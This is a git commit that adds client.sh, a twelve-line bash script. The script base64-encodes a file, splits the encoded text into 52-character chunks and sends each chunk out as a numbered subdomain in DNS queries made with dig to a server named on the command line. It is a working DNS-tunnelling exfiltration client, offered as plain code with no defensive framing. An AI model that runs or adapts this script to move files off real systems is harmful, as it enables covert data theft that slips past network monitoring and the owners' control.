35dafaa051f3215e2caea7587ec48693f9a82714
radman404 <radman404@users.noreply.github.com>
2015-09-28 11:55:32 +0100

    Create client.sh

---
+++ client.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+file=$1
+server=$2
+base64f=$(base64 $file| fold -w 52)
+n=0
+base64 -w 52 $file| while read line; do
+  line=$(echo $line |tr -d '\n')
+  req=$(echo "${n}.$line")
+  #echo $req
+  dig @$server "${n}.${line}.<domain>.<name>"
+  n=$((n+1))
+done 
